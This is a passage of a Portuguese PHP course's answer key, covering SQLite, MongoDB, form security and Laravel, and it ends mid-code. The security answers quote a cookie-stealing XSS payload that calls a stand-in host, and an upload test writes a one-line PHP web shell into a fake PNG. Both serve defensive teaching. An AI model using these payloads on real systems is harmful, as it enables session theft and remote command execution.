+<p>Não. O SQLite é um banco <strong>embutido</strong>: uma biblioteca que lê e grava um arquivo, sem servidor. É a escolha certa para aplicações de um servidor só com volume de escrita moderado (sites de conteúdo, painéis internos, blogs), aplicativos de desktop e celular, ferramentas de linha de comando e caches locais. É rápido (sem ida à rede), não exige administração e o <em>backup</em> é copiar um arquivo (com cuidado, via <code>.backup</code> ou <code>VACUUM INTO</code>). A limitação principal são as <strong>escritas concorrentes</strong>: há uma única escrita por vez no banco inteiro. Com o modo WAL (<code>PRAGMA journal_mode=WAL</code>), leituras e uma escrita convivem bem, mas muitos processos escrevendo ao mesmo tempo, ou vários servidores acessando o mesmo arquivo pela rede, pedem um banco servidor.</p>
+<div class="questao" id="q47">
+<span class="num">Q47</span>
+<div class="corpo">
+<p class="titulo">Modelando no MongoDB</p>
+<p>Para guardar os pedidos da livraria no MongoDB, como fica o documento de um pedido? O que fica embutido e o que fica como referência, e por quê?</p>
+</div>
+</div>
+<pre class="codigo"><code>{
+  "_id": ObjectId("..."),
+  "numero": 1042,
+  "clienteId": ObjectId("..."),
+  "cliente": { "nome": "Ana", "email": "ana@exemplo.com" },
+  "itens": [
+    { "livroId": ObjectId("..."), "titulo": "Vidas Secas", "qtd": 1, "precoCentavos": 4990 }
+  ],
+  "status": "pago",
+  "criadoEm": ISODate("2026-10-20T10:00:00Z")
+}</code></pre>
+<p>Os <strong>itens</strong> ficam embutidos: pertencem ao pedido, são lidos sempre com ele e não existem sozinhos. O <strong>título e o preço</strong> são copiados no item de propósito: o pedido precisa registrar o preço <strong>do momento da compra</strong>, que não deve mudar quando o catálogo mudar. O <strong>cliente</strong> fica como referência (<code>clienteId</code>), com uma cópia do nome e do e-mail só para exibição: o cadastro dele é uma entidade independente, alterada em outro lugar. A regra geral: embuta o que é lido junto e pertence ao documento; referencie o que tem vida própria ou cresce sem limite (um documento tem até 16 MB).</p>
+<h3>Exercícios de código — respostas</h3>
+<div class="questao" id="q48">
+<span class="num">Q48</span>
+<div class="corpo">
+<p class="titulo">SQLite com transação e UPSERT</p>
+<p>Com o SQLite, crie a tabela <code>estoque(livro_id PRIMARY KEY, qtd)</code> e escreva <code>function darBaixa(PDO $pdo, array $itens): void</code>, que baixa o estoque de vários livros numa transação, recusando a operação inteira se algum ficar negativo. Use um <em>UPSERT</em> (<code>INSERT ... ON CONFLICT DO UPDATE</code>) para a entrada de estoque. Mostre uma baixa que dá certo e uma que é desfeita.</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+$pdo = new PDO('sqlite::memory:', options: [PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION]);
+$pdo-&gt;exec("CREATE TABLE estoque (livro_id INTEGER PRIMARY KEY, qtd INTEGER NOT NULL CHECK (qtd &gt;= 0))");
+
+function entrada(PDO $pdo, int $livro, int $qtd): void
+{
+    $pdo-&gt;prepare("INSERT INTO estoque (livro_id, qtd) VALUES (:l, :q)
+                   ON CONFLICT (livro_id) DO UPDATE SET qtd = qtd + excluded.qtd")
+        -&gt;execute(['l' =&gt; $livro, 'q' =&gt; $qtd]);
+}
+
+function darBaixa(PDO $pdo, array $itens): void
+{
+    $pdo-&gt;beginTransaction();
+    try {
+        $st = $pdo-&gt;prepare("UPDATE estoque SET qtd = qtd - ? WHERE livro_id = ?");
+        foreach ($itens as $livro =&gt; $qtd) {
+            $st-&gt;execute([$qtd, $livro]);  // o CHECK recusa estoque negativo
+        }
+        $pdo-&gt;commit();
+    } catch (PDOException $e) {
+        $pdo-&gt;rollBack();
+        throw new DomainException("estoque insuficiente; nada foi baixado", previous: $e);
+    }
+}
+
+function mostrar(PDO $pdo): string
+{
+    return implode(', ', array_map(fn($r) =&gt; "livro {$r[0]}: {$r[1]}", $pdo-&gt;query("SELECT * FROM estoque ORDER BY livro_id")-&gt;fetchAll(PDO::FETCH_NUM)));
+}
+
+entrada($pdo, 1, 5);
+entrada($pdo, 2, 1);
+entrada($pdo, 1, 3);  // já existe: soma
+echo "após entradas: ", mostrar($pdo), "\n";
+
+darBaixa($pdo, [1 =&gt; 2, 2 =&gt; 1]);
+echo "após baixa:    ", mostrar($pdo), "\n";
+
+try {
+    darBaixa($pdo, [1 =&gt; 1, 2 =&gt; 1]);  // o livro 2 está zerado
+} catch (DomainException $e) {
+    echo "recusado: ", $e-&gt;getMessage(), "\n";
+}
+echo "estoque final: ", mostrar($pdo), "\n";</code></pre>
+<pre class="saida"><code>após entradas: livro 1: 8, livro 2: 1
+após baixa:    livro 1: 6, livro 2: 0
+recusado: estoque insuficiente; nada foi baixado
+estoque final: livro 1: 6, livro 2: 0</code></pre>
+<p>O livro 1 teve a baixa executada <strong>antes</strong> da falha do livro 2, e mesmo assim voltou para 6: o <code>rollBack</code> desfez tudo. A regra "estoque não fica negativo" está no próprio banco (<code>CHECK</code>), e não só no PHP: vale para qualquer programa que grave na tabela. O <code>excluded.qtd</code> no <em>UPSERT</em> é o valor que se tentou inserir. A mesma sintaxe funciona no PostgreSQL; no MySQL, o equivalente é <code>ON DUPLICATE KEY UPDATE qtd = qtd + VALUES(qtd)</code>.</p>
+<div class="questao" id="q49">
+<span class="num">Q49</span>
+<div class="corpo">
+<p class="titulo">Consultas no MongoDB</p>
+<p>Com a biblioteca <code>mongodb/mongodb</code> (instalada pelo Composer, junto com a extensão <code>mongodb</code>), escreva o código que insere três pedidos no formato da pergunta anterior, busca os pedidos pagos de um cliente e calcula, com uma <em>aggregation pipeline</em>, o total vendido por livro, do maior para o menor.</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+require __DIR__ . '/vendor/autoload.php';
+
+use MongoDB\BSON\ObjectId;
+use MongoDB\BSON\UTCDateTime;
+use MongoDB\Client;
+
+$pedidos = (new Client('mongodb://127.0.0.1:27017'))-&gt;selectCollection('livraria', 'pedidos');
+$ana = new ObjectId();
+
+$pedidos-&gt;insertMany([
+    ['numero' =&gt; 1, 'clienteId' =&gt; $ana, 'status' =&gt; 'pago', 'criadoEm' =&gt; new UTCDateTime(),
+     'itens' =&gt; [['titulo' =&gt; 'Vidas Secas', 'qtd' =&gt; 1, 'precoCentavos' =&gt; 4990]]],
+    ['numero' =&gt; 2, 'clienteId' =&gt; $ana, 'status' =&gt; 'pendente', 'criadoEm' =&gt; new UTCDateTime(),
+     'itens' =&gt; [['titulo' =&gt; 'Iracema', 'qtd' =&gt; 2, 'precoCentavos' =&gt; 2500]]],
+    ['numero' =&gt; 3, 'clienteId' =&gt; new ObjectId(), 'status' =&gt; 'pago', 'criadoEm' =&gt; new UTCDateTime(),
+     'itens' =&gt; [['titulo' =&gt; 'Vidas Secas', 'qtd' =&gt; 2, 'precoCentavos' =&gt; 4990],
+                 ['titulo' =&gt; 'Iracema', 'qtd' =&gt; 1, 'precoCentavos' =&gt; 2500]]],
+]);
+
+foreach ($pedidos-&gt;find(['clienteId' =&gt; $ana, 'status' =&gt; 'pago'], ['sort' =&gt; ['numero' =&gt; 1]]) as $p) {
+    echo "pedido pago da Ana: {$p['numero']}\n";
+}
+
+$porLivro = $pedidos-&gt;aggregate([
+    ['$match' =&gt; ['status' =&gt; 'pago']],
+    ['$unwind' =&gt; '$itens'],  // um documento por item
+    ['$group' =&gt; [
+        '_id' =&gt; '$itens.titulo',
+        'exemplares' =&gt; ['$sum' =&gt; '$itens.qtd'],
+        'totalCentavos' =&gt; ['$sum' =&gt; ['$multiply' =&gt; ['$itens.qtd', '$itens.precoCentavos']]],
+    ]],
+    ['$sort' =&gt; ['totalCentavos' =&gt; -1]],
+]);
+foreach ($porLivro as $l) {
+    printf("%-12s %d exemplar(es), R$ %.2f\n", $l['_id'], $l['exemplares'], $l['totalCentavos'] / 100);
+}</code></pre>
+<p>Com um MongoDB rodando (<code>docker run -d -p 27017:27017 mongo:8</code>, ou instalado pelo gerenciador de pacotes, com <code>sudo systemctl start mongod</code>), o resultado esperado é o pedido 1 da Ana, e depois Vidas Secas com 3 exemplares (R$ 149,70) e Iracema com 1 (R$ 25,00): o pedido pendente fica de fora pelo <code>$match</code>. A <em>pipeline</em> é uma sequência de estágios, como os comandos de um <em>pipe</em> no terminal: filtrar, "desenrolar" o array de itens, agrupar e ordenar. O <code>$match</code> vem primeiro para que os estágios seguintes processem menos documentos e para poder usar índices. A coleção é criada na primeira inserção, sem <code>CREATE TABLE</code>.</p>
+</section>
+<section class="modulo" id="modulo-7">
+<h2><span class="rotulo">MÓDULO 7</span> A web: formulários, sessões e segurança</h2>
+<p class="intro">Formulários, sessões e cookies, upload de arquivos, XSS, CSRF e SQL injection, Composer e namespaces, PSRs e boas práticas.</p>
+<p class="aulas-titulo">Artigos 34 a 40</p>
+<ul class="aulas">
+<li><span class="n">#34</span> Formulários HTML e PHP</li>
+<li><span class="n">#35</span> Sessions e Cookies</li>
+<li><span class="n">#36</span> Upload de Arquivos</li>
+<li><span class="n">#37</span> Segurança em Formulários: XSS, CSRF e SQL Injection</li>
+<li><span class="n">#38</span> Composer e Namespaces</li>
+<li><span class="n">#39</span> PSR e Padrões de Código</li>
+<li><span class="n">#40</span> Boas Práticas e Código Limpo em PHP</li>
+</ul>
+<h3>Perguntas conceituais — respostas</h3>
+<div class="questao" id="q50">
+<span class="num">Q50</span>
+<div class="corpo">
+<p class="titulo">GET ou POST</p>
+<p>Quando um formulário deve usar <code>GET</code> e quando <code>POST</code>? Por que o formulário de busca do site usa <code>GET</code>, e o de login não pode usar?</p>
+</div>
+</div>
+<p><code>GET</code> é para <strong>consultar</strong>: os dados vão na URL, a requisição pode ser repetida, guardada nos favoritos, compartilhada e posta em cache, e não deve alterar nada no servidor. <code>POST</code> é para <strong>alterar</strong> (criar, enviar, apagar): os dados vão no corpo, e o navegador avisa antes de reenviar. A busca usa <code>GET</code> porque o resultado de <code>/busca?q=machado</code> pode ser compartilhado e indexado. O login não pode usar <code>GET</code> porque a senha ficaria na URL, e URLs aparecem no histórico do navegador, nos <em>logs</em> do servidor e dos <em>proxies</em> e no cabeçalho <code>Referer</code> enviado a outros sites. O <code>POST</code> não criptografa nada: a proteção real é o HTTPS.</p>
+<div class="questao" id="q51">
+<span class="num">Q51</span>
+<div class="corpo">
+<p class="titulo">Sessão e cookie</p>
+<p>Qual a diferença entre guardar o carrinho num <em>cookie</em> e na sessão (<code>$_SESSION</code>)? Que atributos um <em>cookie</em> de sessão deve ter, e por que chamar <code>session_regenerate_id(true)</code> no login?</p>
+</div>
+</div>
+<p>O <em>cookie</em> fica <strong>no navegador</strong>: o usuário pode ler e alterar o conteúdo, e ele viaja em toda requisição (com limite de uns 4 KB). A sessão fica <strong>no servidor</strong>; o navegador guarda só um identificador aleatório (o <em>cookie</em> <code>PHPSESSID</code>). Um carrinho com preços num <em>cookie</em> pode ser adulterado; na sessão, não. O <em>cookie</em> de sessão deve ter <code>HttpOnly</code> (o JavaScript não o lê, o que limita o roubo por XSS), <code>Secure</code> (só via HTTPS) e <code>SameSite=Lax</code> ou <code>Strict</code> (não vai em requisições iniciadas por outros sites, o que reduz o CSRF). O <code>session_regenerate_id(true)</code> no login troca o identificador e descarta o antigo, contra a <strong>fixação de sessão</strong>: o atacante não consegue "plantar" um id conhecido antes do login e aproveitá-lo depois.</p>
+<div class="questao" id="q52">
+<span class="num">Q52</span>
+<div class="corpo">
+<p class="titulo">XSS: escapar na saída</p>
+<p>Um comentário com <code>&lt;script&gt;fetch('https://mal.com?c='+document.cookie)&lt;/script&gt;</code> foi gravado no banco. Onde e como o PHP deve impedir que ele execute? Por que filtrar na entrada não basta?</p>
+</div>
+</div>
+<p>Na <strong>saída</strong>: todo dado exibido no HTML passa por <code>htmlspecialchars($texto, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')</code>, que transforma <code>&lt;</code> em <code>&amp;lt;</code>, e o navegador mostra o texto em vez de executá-lo. Os <em>templates</em> modernos (Blade, Twig, Plates com <code>$this-&gt;e()</code>) fazem isso por padrão. Filtrar na entrada não basta porque o mesmo dado vai para lugares diferentes (HTML, atributo, JavaScript, URL, JSON), cada um com regras próprias de escape, e porque dados entram por caminhos que o filtro não vê (importações, APIs, o próprio banco). Como camada extra, um cabeçalho <em>Content-Security-Policy</em> que proíba <em>scripts</em> inline impede a execução mesmo quando um escape é esquecido.</p>
+<div class="questao" id="q53">
+<span class="num">Q53</span>
+<div class="corpo">
+<p class="titulo">PSR-12 e as outras PSRs</p>
+<p>O que é uma PSR, e qual a diferença de natureza entre a PSR-12 (estilo de código), a PSR-4 (<em>autoload</em>) e a PSR-7 (mensagens HTTP)?</p>
+</div>
+</div>
+<p>PSRs (<em>PHP Standards Recommendations</em>) são padrões publicados pelo PHP-FIG, um grupo de projetos que combinam convenções para que bibliotecas diferentes funcionem juntas. Elas são de naturezas diferentes: a <strong>PSR-12</strong> (hoje sucedida pelo PER Coding Style) é só <strong>estilo</strong>: indentação, chaves, espaços, de modo que todo código PHP pareça do mesmo autor, e é aplicada por ferramentas como o PHP-CS-Fixer; a <strong>PSR-4</strong> é uma <strong>convenção de nomes</strong>, que liga <em>namespace</em> a pasta e permite um <em>autoload</em> universal; a <strong>PSR-7</strong> define <strong>interfaces</strong> (<code>RequestInterface</code>, <code>ResponseInterface</code>) que permitem trocar a biblioteca HTTP ou escrever um <em>middleware</em> (PSR-15) que funciona em qualquer <em>framework</em> compatível. Outras PSRs muito usadas: PSR-3 (log), PSR-11 (contêiner) e PSR-20 (relógio).</p>
+<h3>Exercícios de código — respostas</h3>
+<div class="questao" id="q54">
+<span class="num">Q54</span>
+<div class="corpo">
+<p class="titulo">Um formulário com CSRF e PRG</p>
+<p>Escreva <code>form.php</code>, servido pelo <code>php -S</code>, com um formulário de contato que: gera um <em>token</em> CSRF na sessão; no <code>POST</code>, recusa com 403 <em>token</em> ausente ou errado; valida o e-mail com <code>filter_var</code>; e, se tudo estiver certo, guarda uma mensagem de sucesso na sessão e redireciona com 303 (Post/Redirect/Get). Teste com <code>curl</code>, guardando os <em>cookies</em> num arquivo.</p>
+</div>
+</div>
+<p><code>form.php</code>:</p>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+session_start(['cookie_httponly' =&gt; true, 'cookie_samesite' =&gt; 'Lax']);
+$_SESSION['csrf'] ??= bin2hex(random_bytes(32));
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (!hash_equals($_SESSION['csrf'], (string) ($_POST['csrf'] ?? ''))) {
+        http_response_code(403);
+        exit("token CSRF inválido\n");
+    }
+    $email = filter_var($_POST['email'] ?? '', FILTER_VALIDATE_EMAIL);
+    if ($email === false) {
+        http_response_code(422);
+        exit("e-mail inválido\n");
+    }
+    $_SESSION['flash'] = "mensagem de $email recebida";
+    header('Location: /form.php', response_code: 303);  // PRG: o F5 depois não reenvia
+    exit;
+}
+
+$flash = $_SESSION['flash'] ?? null;
+unset($_SESSION['flash']);  // a mensagem aparece uma vez só
+$e = fn(string $s): string =&gt; htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
+?&gt;
+&lt;?= $flash ? "&lt;p class=\"ok\"&gt;{$e($flash)}&lt;/p&gt;\n" : '' ?&gt;
+&lt;form method="post"&gt;
+  &lt;input type="hidden" name="csrf" value="&lt;?= $e($_SESSION['csrf']) ?&gt;"&gt;
+  &lt;input type="email" name="email"&gt;
+&lt;/form&gt;</code></pre>
+<pre class="codigo"><code>php -S 127.0.0.1:8792 &gt;/dev/null 2&gt;&amp;1 &amp;
+servidor=$!
+sleep 1
+url=http://127.0.0.1:8792/form.php
+jar=cookies.txt
+
+token=$(curl -s -c $jar $url | grep -o 'name="csrf" value="[0-9a-f]*' | cut -d'"' -f4)
+echo "token obtido: ${#token} caracteres"
+echo "sem token:     $(curl -s -b $jar -d 'email=ana@exemplo.com' $url)"
+echo "token errado:  $(curl -s -b $jar -d 'csrf=abc&amp;email=ana@exemplo.com' $url)"
+echo "e-mail ruim:   $(curl -s -b $jar -d "csrf=$token&amp;email=ana" $url)"
+curl -s -b $jar -o /dev/null -w "válido:        %{http_code} -&gt; %{redirect_url}\n" -d "csrf=$token&amp;email=ana@exemplo.com" $url
+echo "depois do redirecionamento:"
+curl -s -b $jar $url | grep 'class="ok"'
+echo "recarregando de novo (a mensagem já foi consumida):"
+curl -s -b $jar $url | grep -c 'class="ok"'
+kill $servidor</code></pre>
+<pre class="saida"><code>token obtido: 64 caracteres
+sem token:     token CSRF inválido
+token errado:  token CSRF inválido
+e-mail ruim:   e-mail inválido
+válido:        303 -&gt; http://127.0.0.1:8792/form.php
+depois do redirecionamento:
+&lt;p class="ok"&gt;mensagem de ana@exemplo.com recebida&lt;/p&gt;
+recarregando de novo (a mensagem já foi consumida):
+0</code></pre>
+<p>O <em>token</em> é aleatório, guardado na sessão e conferido com <code>hash_equals</code>: um site atacante pode fazer o navegador enviar o formulário, com o <em>cookie</em> da sessão, mas não consegue ler a página para descobrir o <em>token</em>. O <code>303 See Other</code> instrui o navegador a seguir com um <code>GET</code>. A mensagem <em>flash</em> é removida da sessão ao ser exibida, por isso a última contagem é 0 (o <code>grep -c</code> não achou nenhuma linha). O <code>$e</code> escapa tudo o que vai para o HTML, inclusive o e-mail que o próprio usuário digitou.</p>
+<div class="questao" id="q55">
+<span class="num">Q55</span>
+<div class="corpo">
+<p class="titulo">Upload seguro</p>
+<p>Escreva <code>upload.php</code> que receba um campo <code>capa</code> e só aceite imagens JPEG ou PNG de até 1 MB, verificando o <strong>conteúdo</strong> com <code>finfo</code> (e não a extensão nem o <code>type</code> enviado pelo navegador), confirmando com <code>getimagesize</code>, e gravando com um nome gerado pelo servidor fora da pasta pública. Teste com <code>curl -F</code> enviando uma imagem real, um PHP renomeado para <code>.png</code> e um arquivo grande.</p>
+</div>
+</div>
+<p><code>upload.php</code>:</p>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+const DESTINO = __DIR__ . '/armazenamento';  // fora da raiz pública, num projeto real
+const MAX = 1024 * 1024;
+
+$f = $_FILES['capa'] ?? null;
+if (!$f || $f['error'] !== UPLOAD_ERR_OK) {
+    http_response_code(400);
+    exit("erro no envio (código " . ($f['error'] ?? 'sem arquivo') . ")\n");
+}
+if ($f['size'] &gt; MAX) {
+    http_response_code(413);
+    exit("arquivo grande demais\n");
+}
+$mime = (new finfo(FILEINFO_MIME_TYPE))-&gt;file($f['tmp_name']);  // lê os bytes do arquivo
+$extensoes = ['image/jpeg' =&gt; 'jpg', 'image/png' =&gt; 'png'];
+if (!isset($extensoes[$mime]) || getimagesize($f['tmp_name']) === false) {
+    http_response_code(415);
+    exit("tipo não permitido: $mime\n");
+}
+@mkdir(DESTINO, 0750);
+$nome = bin2hex(random_bytes(16)) . '.' . $extensoes[$mime];
+move_uploaded_file($f['tmp_name'], DESTINO . "/$nome");
+[$larg, $alt] = getimagesize(DESTINO . "/$nome");
+echo "aceito: {$larg}x{$alt}, $mime, gravado com nome de ", strlen($nome), " caracteres\n";</code></pre>
+<pre class="codigo"><code>php -r '$i = imagecreatetruecolor(40, 60); imagepng($i, "capa.png");'
+printf '&lt;?php system($_GET["c"]); ?&gt;' &gt; falso.png
+head -c 2000000 /dev/zero &gt; grande.png
+
+php -S 127.0.0.1:8793 &gt;/dev/null 2&gt;&amp;1 &amp;
+servidor=$!
+sleep 1
+url=http://127.0.0.1:8793/upload.php
+for arq in capa.png falso.png grande.png; do
+  codigo=$(curl -s -o resposta.txt -w '%{http_code}' -F "capa=@$arq;type=image/png" $url)
+  echo "$arq [$codigo]: $(cat resposta.txt)"
+done
+kill $servidor</code></pre>
+<pre class="saida"><code>capa.png [200]: aceito: 40x60, image/png, gravado com nome de 36 caracteres
+falso.png [415]: tipo não permitido: text/x-php
+grande.png [413]: arquivo grande demais</code></pre>
+<p>O <code>falso.png</code> declarou <code>type=image/png</code> no envio, e mesmo assim foi recusado: o <code>finfo</code> olhou os bytes e achou um texto PHP. Se ele tivesse sido gravado com o nome original numa pasta pública, bastaria visitar <code>/uploads/falso.png.php</code> (ou um <code>.png</code> num servidor mal configurado) para executar comandos no servidor. As defesas são em camadas: verificar o conteúdo, gerar o nome, gravar fora da raiz pública (servindo por um script, ou com a execução de PHP desligada na pasta) e, para imagens, reprocessar com a GD ou a Imagick, o que descarta qualquer carga escondida. O limite também precisa estar no <code>php.ini</code> (<code>upload_max_filesize</code> e <code>post_max_size</code>), senão o arquivo inteiro é recebido antes da recusa.</p>
+<div class="questao" id="q56">
+<span class="num">Q56</span>
+<div class="corpo">
+<p class="titulo">Escapar conforme o contexto</p>
+<p>Escreva um programa que monte a mesma informação vinda do usuário (<code>O'Reilly &lt;b&gt;&amp;&lt;/b&gt; "Cia"</code>) em quatro contextos (o corpo do HTML, um atributo, uma URL e um bloco JSON dentro de um <code>&lt;script&gt;</code>), cada um com a função de escape certa, e mostre o resultado.</p>
+</div>
+</div>
+<pre class="codigo"><code>&lt;?php
+declare(strict_types=1);
+
+$entrada = 'O\'Reilly &lt;b&gt;&amp;&lt;/b&gt; "Cia"';
+
+$html = htmlspecialchars($entrada, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
+echo "corpo:    &lt;p&gt;$html&lt;/p&gt;\n";
+echo "atributo: &lt;input value=\"$html\"&gt;\n";
+echo "URL:      &lt;a href=\"/busca?q=", urlencode($entrada), "\"&gt;\n";
+$json = json_encode(['editora' =&gt; $entrada], JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_UNESCAPED_UNICODE);
+echo "script:   &lt;script&gt;const dados = $json;&lt;/script&gt;\n";</code></pre>
+<pre class="saida"><code>corpo:    &lt;p&gt;O&amp;#039;Reilly &amp;lt;b&amp;gt;&amp;amp;&amp;lt;/b&amp;gt; &amp;quot;Cia&amp;quot;&lt;/p&gt;
+atributo: &lt;input value="O&amp;#039;Reilly &amp;lt;b&amp;gt;&amp;amp;&amp;lt;/b&amp;gt; &amp;quot;Cia&amp;quot;"&gt;
+URL:      &lt;a href="/busca?q=O%27Reilly+%3Cb%3E%26%3C%2Fb%3E+%22Cia%22"&gt;
+script:   &lt;script&gt;const dados = {"editora":"O\u0027Reilly \u003Cb\u003E\u0026\u003C\/b\u003E \u0022Cia\u0022"};&lt;/script&gt;</code></pre>
+<p>No corpo e no atributo entre aspas, o <code>htmlspecialchars</code> com <code>ENT_QUOTES</code> basta (sem as aspas no atributo, nem ele resolve: sempre use aspas). Na URL, o <code>urlencode</code> transforma espaços e símbolos em <code>%XX</code>; e o valor ainda passaria pelo <code>htmlspecialchars</code> se a URL contivesse <code>&amp;</code> entre parâmetros. Dentro de <code>&lt;script&gt;</code>, o JSON com as <em>flags</em> <code>JSON_HEX_*</code> impede que um <code>&lt;/script&gt;</code> no dado feche o bloco antes da hora. Não existe uma função que sirva para todos os contextos; por isso os <em>templates</em> escapam o HTML por padrão e oferecem filtros para os outros.</p>
+</section>
+<section class="modulo" id="modulo-8">
+<h2><span class="rotulo">MÓDULO 8</span> Laravel</h2>
+<p class="intro">Introdução ao Laravel, Eloquent, Blade, autenticação e autorização, e APIs.</p>
+<p class="aulas-titulo">Artigos 41 a 45</p>
+<ul class="aulas">
+<li><span class="n">#41</span> Introdução ao Laravel</li>
+<li><span class="n">#42</span> Eloquent ORM com Laravel</li>
+<li><span class="n">#43</span> Blade — Templates no Laravel</li>
+<li><span class="n">#44</span> Autenticação e Autorização no Laravel</li>
+<li><span class="n">#45</span> APIs com Laravel</li>
+</ul>
+<h3>Perguntas conceituais — respostas</h3>
+<div class="questao" id="q57">
+<span class="num">Q57</span>
+<div class="corpo">
+<p class="titulo">O que o Laravel faz por você</p>
+<p>Compare criar a livraria em PHP puro (como nos módulos anteriores) e em Laravel. Cite quatro coisas que o <em>framework</em> entrega prontas, e um custo de usá-lo.</p>
+</div>
+</div>
+<p>Prontos no Laravel: <strong>roteamento</strong> com parâmetros, grupos e <em>middlewares</em>; <strong>Eloquent</strong> (ORM) com <em>migrations</em>, <em>seeders</em> e <em>factories</em>; <strong>Blade</strong> com escape automático e herança de <em>layouts</em>; <strong>autenticação</strong> (com os <em>starter kits</em>), autorização com <em>gates</em> e <em>policies</em>, proteção CSRF e criptografia; <strong>validação</strong> declarativa com mensagens traduzíveis; <strong>filas</strong>, agendamento de tarefas, cache, e-mail e eventos com a mesma API para vários <em>backends</em>; e <strong>testes</strong> HTTP com banco em memória. O custo: muita "mágica" (<em>facades</em>, injeção automática, convenções de nome) que esconde o que acontece e precisa ser aprendida; dependência do ciclo de versões do <em>framework</em>, com atualizações a cada ano; e mais código carregado por requisição que um <em>script</em> enxuto, o que importa pouco na maioria dos casos. Conhecer o PHP puro antes é o que permite entender o que o Laravel automatiza.</p>
+<div class="questao" id="q58">
+<span class="num">Q58</span>
+<div class="corpo">
+<p class="titulo">Mass assignment</p>
+<p>O que é <em>mass assignment</em> no Eloquent, e por que <code>Livro::create($request-&gt;all())</code> é perigoso sem <code>$fillable</code>? Qual a forma recomendada?</p>
+</div>
+</div>
+<p>É criar ou atualizar um modelo a partir de um array inteiro de uma vez. Com <code>$request-&gt;all()</code>, <strong>qualquer</strong> campo enviado pelo cliente vai para o modelo: se a tabela <code>users</code> tem a coluna <code>is_admin</code>, um formulário de cadastro com um campo extra <code>is_admin=1</code> cria um administrador. O Eloquent protege por padrão: só aceita em massa os atributos listados em <code>$fillable</code> (ou não listados em <code>$guarded</code>), e lança exceção ou ignora os outros. A forma recomendada é usar <strong>só os dados validados</strong>: <code>Livro::create($request-&gt;validated())</code>, com as regras num <em>Form Request</em>. Assim, o que não tem regra de validação nem chega ao modelo. É o mesmo <em>overposting</em> do caderno de C#.</p>
+<div class="questao" id="q59">
+<span class="num">Q59</span>
+<div class="corpo">
+<p class="titulo">Policies</p>
+<p>O editor pode alterar qualquer livro; o autor, só os próprios. Onde essa regra deve morar no Laravel, e por que não no <em>controller</em>?</p>
+</div>
+</div>
+<p>Numa <strong>Policy</strong> (<code>LivroPolicy</code>), com um método por ação: <code>update(User $user, Livro $livro): bool</code> devolve <code>$user-&gt;role === 'editor' || $livro-&gt;autor_id === $user-&gt;id</code>. O <em>controller</em> só pergunta (<code>$this-&gt;authorize('update', $livro)</code> ou <code>Gate::authorize</code>), e o Blade usa a mesma regra para mostrar ou esconder o botão (<code>@can('update', $livro)</code>). Com a regra no <em>controller</em>, ela seria repetida no <em>controller</em> da API, na listagem que decide quais botões mostrar e no comando de terminal, e uma das cópias acabaria diferente. Centralizada, é testável sozinha e muda num lugar só. É também um dos itens pendentes deste próprio site: "author edita apenas os próprios artigos".</p>
+<h3>Exercícios de código — respostas</h3>
+<div class="questao" id="q60">
+<span class="num">Q60</span>
+<div class="corpo">
+<p class="titulo">Rotas, controller e validação no Laravel</p>
+<p>Escreva, para um projeto Laravel, a rota de recurso <code>livros</code>, o <code>StoreLivroRequest</code> com as regras (título obrigatório até 200 caracteres, ISBN único com 13 dígitos, preço numérico maior que zero) e o método <code>store</code> do <code>LivroController</code>, que cria o livro com os dados validados e redireciona para a página dele com uma mensagem.</p>
+</div>
+</div>
+<pre class="codigo"><code>// routes/web.php
+use App\Http\Controllers\LivroController;
+
+Route::resource('livros', LivroController::class)-&gt;middleware('auth')-&gt;except(['index', 'show']);
+Route::resource('livros', LivroController::class)-&gt;only(['index', 'show']);</code></pre>
+<pre class="codigo"><code>// app/Http/Requests/StoreLivroRequest.php
+namespace App\Http\Requests;
+
+use Illuminate\Foundation\Http\FormRequest;
+
+class StoreLivroRequest extends FormRequest
+{
+    public function authorize(): bool
+    {
+        return $this-&gt;user()-&gt;can('create', \App\Models\Livro::class);
+    }
+
+    public function rules(): array
+    {
+        return [
+            'titulo' =&gt; ['required', 'string', 'max:200'],
+            'isbn' =&gt; ['required', 'digits:13', 'unique:livros,isbn'],
+            'preco' =&gt; ['required', 'numeric', 'gt:0'],
+        ];
+    }
+}</code></pre>
+<pre class="codigo"><code>// app/Http/Controllers/LivroController.php
+public function store(StoreLivroRequest $request): RedirectResponse
+{
+    $livro = Livro::create($request-&gt;validated());
+
+    return redirect()
+        -&gt;route('livros.show', $livro)
+        -&gt;with('status', 'Livro cadastrado.');
+}</code></pre>
+<p>O controlador não tem nenhum <code>if</code> de validação nem de permissão: o <em>Form Request</em> roda <strong>antes</strong> do método, e, se falhar, o Laravel redireciona de volta ao formulário com os erros e os valores digitados (ou devolve 422 em JSON, numa requisição de API). As rotas públicas (<code>index</code>, <code>show</code>) ficam fora do <em>middleware</em> <code>auth</code>. O <code>redirect()-&gt;route(...)-&gt;with(...)</code> é o PRG do módulo 7 com a mensagem <em>flash</em>, em uma linha. No <em>model</em>, <code>protected $fillable = ['titulo', 'isbn', 'preco'];</code> completa a proteção contra <em>mass assignment</em>.</p>
+<div class="questao" id="q61">
+<span class="num">Q61</span>
+<div class="corpo">
+<p class="titulo">Eloquent sem N+1</p>
+<p>Com os <em>models</em> <code>Autor</code> (hasMany <code>livros</code>) e <code>Livro</code> (belongsTo <code>autor</code>), escreva a consulta da página inicial: os 10 livros mais recentes com o nome do autor, sem o problema N+1; a lista de autores com a quantidade de livros de cada um, sem carregar os livros; e os autores que têm pelo menos um livro acima de R$ 100. Mostre como o Laravel pode <strong>proibir</strong> o <em>lazy loading</em> em desenvolvimento.</p>
+</div>
+</div>
+<pre class="codigo"><code>// Os 10 mais recentes, com o autor: 2 consultas no total, não 11
+$livros = Livro::with('autor:id,nome')-&gt;latest()-&gt;take(10)-&gt;get();
+
+// Autores com a contagem: uma subconsulta COUNT, sem carregar os livros
+$autores = Autor::withCount('livros')-&gt;orderByDesc('livros_count')-&gt;get();
+foreach ($autores as $a) {
